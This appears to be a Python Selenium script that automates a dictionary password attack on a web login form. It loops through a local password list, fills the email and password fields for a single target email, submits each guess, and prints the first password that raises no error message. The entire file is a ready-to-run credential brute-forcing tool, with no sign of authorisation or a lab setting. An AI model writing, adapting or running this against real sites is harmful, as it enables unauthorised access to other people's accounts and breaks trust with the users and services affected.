from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import time
import os
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# ! use env variables or pass them directly to your program
# getting varibles from .env or setting default values
URL = os.environ.get('URL', "google.com")
EMAIL = os.environ.get('EMAIL', "your@email.com")

print(f"get env: {URL} {EMAIL}")

driver = webdriver.Chrome()
driver.get(URL)

IS_COMPLETED = False
password_found = ""

def try_passwords(email, passowrd):
    global password_found
    global IS_COMPLETED

    #  Like an exception
    # crash the program in 5 seconds if we did not get what we expected
    WebDriverWait(driver, 5).until(
        EC.presence_of_element_located((By.ID, "formBasicEmail"))
    )
    input_email = driver.find_element(By.ID, "formBasicEmail")


    WebDriverWait(driver, 5).until(
        EC.presence_of_element_located((By.ID, "formBasicPassword"))
    )
    input_password = driver.find_element(By.ID, "formBasicPassword")

    input_email.clear() # clean input field
    input_email.send_keys(email)
    input_password.clear() # clean input field
    input_password.send_keys(passowrd)

    submit_button = WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
    )
    submit_button.click()

    # Brief delay to allow DOM to update
    time.sleep(1)


    # check error message
    try:
        # Check for error message using the correct selector
        error_message = WebDriverWait(driver, 10).until(
            EC.visibility_of_element_located((By.CSS_SELECTOR, "p.text-red-500 small"))
        )
        print(f"Attempt failed: {error_message.text}, failed password: {password_found}")
        # Keep IS_COMPLETED as False to continue trying passwords

    except TimeoutException:
        print("No error message found. Checking if login was successful...")
        print(f"correct password: {password_found}")
        IS_COMPLETED = True


if __name__ == "__main__":
    try:
        password_file = "passwords.txt"
        with open(password_file, "r") as file:
            for password in file:
                if IS_COMPLETED:
                    break

                password = password.strip()
                if password: 
                    password_found = password
                    try_passwords(EMAIL, password)

        time.sleep(10)

    except FileNotFoundError:
        print(f"Password file '{password_file}' not found.")
    except Exception as e:
        print(f"Error in main: {str(e)}")
    finally:
        driver.quit()